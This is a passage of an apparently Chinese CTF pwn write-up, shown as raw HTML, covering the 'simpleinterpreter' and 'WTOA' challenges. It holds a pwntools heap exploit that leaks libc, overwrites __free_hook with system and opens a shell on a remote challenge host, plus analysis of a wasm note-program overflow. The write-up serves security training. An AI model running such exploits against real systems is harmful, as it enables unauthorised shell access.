</span></span><span class="line"><span class="cl"><span class="n">message_func</span><span class="p">(</span><span class="s1">&#39;bb&#39;</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x78</span><span class="p">)</span> <span class="c1">#double free</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">message_func</span><span class="p">(</span><span class="s2">&#34;cc&#34;</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;c&#34;</span><span class="o">*</span><span class="mh">0x78</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="s2">&#34;cc&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="s2">&#34;cc&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="s2">&#34;aa&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">message_func</span><span class="p">(</span><span class="s1">&#39;aa&#39;</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x78</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="s2">&#34;bb&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 class="heading-element" id="simpleinterpreter"><span>simpleinterpreter</span>
  <a href="#simpleinterpreter" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>程序实现一个c语言编译器，可以解析以下函数和类型。</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111730.png' alt="image-20231217171750751"></p>
<p>那么我们利用malloc 和free 将一个chunk 释放到unsorted bin 中， 利用printf 打印出libc地址，然后tcache 的fd中写入free_hook，申请到free_hook 修改其为system，最后释放一个content为&quot;/bin/sh\x00&quot;的chunk 即可getshell。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;101.200.122.251&#34;</span><span class="p">,</span><span class="mi">13410</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#p=process(&#39;./simpleinterpreter&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.27.so&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>  <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dbg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="o">=</span><span class="kc">None</span>  <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xf7</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mydbg</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">&#34;decompiler connect ida --host 192.168.2.193 --port 3662</span><span class="se">\n</span><span class="s2">b *$rebase(0x0CCB)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="c1">#0x1c48</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">int main(){
</span></span></span><span class="line"><span class="cl"><span class="s2">void *p1;
</span></span></span><span class="line"><span class="cl"><span class="s2">void *p2;
</span></span></span><span class="line"><span class="cl"><span class="s2">void *p3;
</span></span></span><span class="line"><span class="cl"><span class="s2">void *p4;
</span></span></span><span class="line"><span class="cl"><span class="s2">void *p5;
</span></span></span><span class="line"><span class="cl"><span class="s2">void *p6;
</span></span></span><span class="line"><span class="cl"><span class="s2">void *p7;
</span></span></span><span class="line"><span class="cl"><span class="s2">void *p8;
</span></span></span><span class="line"><span class="cl"><span class="s2">void *p9;
</span></span></span><span class="line"><span class="cl"><span class="s2">void *p10;
</span></span></span><span class="line"><span class="cl"><span class="s2">void *p11;
</span></span></span><span class="line"><span class="cl"><span class="s2">p1=malloc(0x100);
</span></span></span><span class="line"><span class="cl"><span class="s2">p2=malloc(0x100);
</span></span></span><span class="line"><span class="cl"><span class="s2">p3=malloc(0x100);
</span></span></span><span class="line"><span class="cl"><span class="s2">p4=malloc(0x100);
</span></span></span><span class="line"><span class="cl"><span class="s2">p5=malloc(0x100);
</span></span></span><span class="line"><span class="cl"><span class="s2">p6=malloc(0x100);
</span></span></span><span class="line"><span class="cl"><span class="s2">p7=malloc(0x100);
</span></span></span><span class="line"><span class="cl"><span class="s2">p8=malloc(0x100);
</span></span></span><span class="line"><span class="cl"><span class="s2">p9=malloc(0x100);
</span></span></span><span class="line"><span class="cl"><span class="s2">free(p1);
</span></span></span><span class="line"><span class="cl"><span class="s2">free(p2);
</span></span></span><span class="line"><span class="cl"><span class="s2">free(p3);
</span></span></span><span class="line"><span class="cl"><span class="s2">free(p4);
</span></span></span><span class="line"><span class="cl"><span class="s2">free(p5);
</span></span></span><span class="line"><span class="cl"><span class="s2">free(p6);
</span></span></span><span class="line"><span class="cl"><span class="s2">free(p7);
</span></span></span><span class="line"><span class="cl"><span class="s2">free(p8);
</span></span></span><span class="line"><span class="cl"><span class="s2">printf(&#34;</span><span class="si">%s</span><span class="s2">&#34;,p8);
</span></span></span><span class="line"><span class="cl"><span class="s2">read(0,p7,0x8);
</span></span></span><span class="line"><span class="cl"><span class="s2">p10=malloc(0x100);
</span></span></span><span class="line"><span class="cl"><span class="s2">read(0,p10,0x8);
</span></span></span><span class="line"><span class="cl"><span class="s2">p11=malloc(0x100);
</span></span></span><span class="line"><span class="cl"><span class="s2">read(0,p11,0x8);
</span></span></span><span class="line"><span class="cl"><span class="s2">free(p10);
</span></span></span><span class="line"><span class="cl"><span class="s2">}&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Code size: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Please give me the code to interpret:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span><span class="o">=</span><span class="n">uu64</span><span class="p">()</span><span class="o">-</span><span class="mh">0x3ebca0</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libc_base&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">(</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111731.png' alt="image-20231217163443564"></p>
<h3 class="heading-element" id="wtoa"><span>WTOA</span>
  <a href="#wtoa" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>参考链接：https://www.xp0int.top/posts/2023/12/18/2023-%E5%BC%BA%E7%BD%91%E6%9D%AF-Quals-Writeup-By-Xp0int/#11-chatting</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111732.png' alt="Untitled"></p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111733.png' alt="Untitled"></p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111734.png' alt="Untitled"></p>
<p>从ida 中的function call 中猜测main函数为function[17]</p>
<p>ida 导出function cal</p>
<p>先导出为test.gdl</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111735.jpeg' alt="Untitled"></p>
<p>ubuntu 执行</p>
<p><code>sudo apt-get install cflow graphviz</code></p>
<p><code>sudo apt install libgraph-easy-perl</code></p>
<p><code>graph-easy --input=test.gdl --as_dot -o test.dot</code></p>
<p>先运行程序发现是一个经典的菜单题目，因此主要逻辑函数里面肯定存在5个功能 和while 循环</p>
<p>最终发现function_17_ 是符合要求的，因此我们可以在function_17 下断点验证我们的猜想</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111736.png' alt="Untitled"></p>
<p>我们会发现，我们执行function 16会打印菜单字符串</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111737.png' alt="Untitled"></p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111738.png' alt="Untitled"></p>
<p>注意到function51 的第三个参数为0x477，而菜单字符串的地址为0x1b477，0x1b000正好是.rodata.wasm 段的起始地址，因此推断字符串的寻址应该为段基址+偏移</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111739.png' alt="Untitled"></p>
<p>那么我们很容易得到各个函数的位置。</p>
<p>接下来我们创建一些chunk ，观察结构。</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111740.png' alt="Untitled"></p>
<p>发现note 结构体的一些内容如图所示，推测0x501cc0是note content的偏移，因为note content也是0xcc0 结尾的，而0x8 就是note 的size，还有一些特殊的值比如next 和prev  的note_struct 偏移，剩下的应该是一些特殊标志变量。</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111741.png' alt="Untitled"></p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111742.png' alt="Untitled"></p>
<p>接着分析主函数</p>
<p>当我下断点在function 56 时，会发现要求我们输入</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111743.png' alt="Untitled"></p>
<p>注意到rdx为0，rcx为0x501b20，r8为0x2，</p>
<p>因此推测改函数实现了read 的功能<code>read(0,offset,0x2)</code> ，而真正的地址应该为段基址+offset</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111744.png' alt="Untitled"></p>
<p>输入之前该地址的内容为空</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111745.png' alt="Untitled"></p>
<p>输入之后<code>S\n</code> 之后正好为<code>'\x0a\x53'</code></p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111746.png' alt="Untitled"></p>
<p>接下来根据读入的字符串 <code>-'A'</code> ，switch case进行选择功能</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111747.png' alt="Untitled"></p>
<p>接下来还可以利用patch 讲function51的第三个参数加上0x1b000，方便我们观看，</p>
<p>还可以推出function 24 类似于atoi函数</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111748.png' alt="Untitled"></p>
<p>function 9里面调用了function 56read函数，进行逐个字节读入。</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111749.png' alt="Untitled"></p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111750.png' alt="Untitled"></p>
<p>在edit函数中存在一个明显的漏洞函数，当输入的length为0x345231时，我们可以读入0x30 字节。</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111751.png' alt="Untitled"></p>
<p>程序开始时会读入flag ，位于我们创建的note struct 上方，因此，我们可以利用edit 的溢出，更改下一个chunk 的content 偏移，让它指向flag的位置，从而打印出flag。</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111752.png' alt="Untitled"></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#p=process(&#34;./launch.sh&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">([</span><span class="s1">&#39;./wasmtime&#39;</span><span class="p">,</span><span class="s1">&#39;run&#39;</span><span class="p">,</span><span class="s1">&#39;--env&#39;</span><span class="p">,</span> <span class="s2">&#34;FLAG=flag</span><span class="si">{you_cat_the_flag}</span><span class="s2">&#34;</span><span class="p">,</span><span class="s1">&#39;--disable-cache&#39;</span><span class="p">,</span><span class="s1">&#39;--allow-precompiled&#39;</span><span class="p">,</span><span class="s1">&#39;./wtoa&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mydbg</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>  <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dbg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="o">=</span><span class="kc">None</span>  <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xff</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
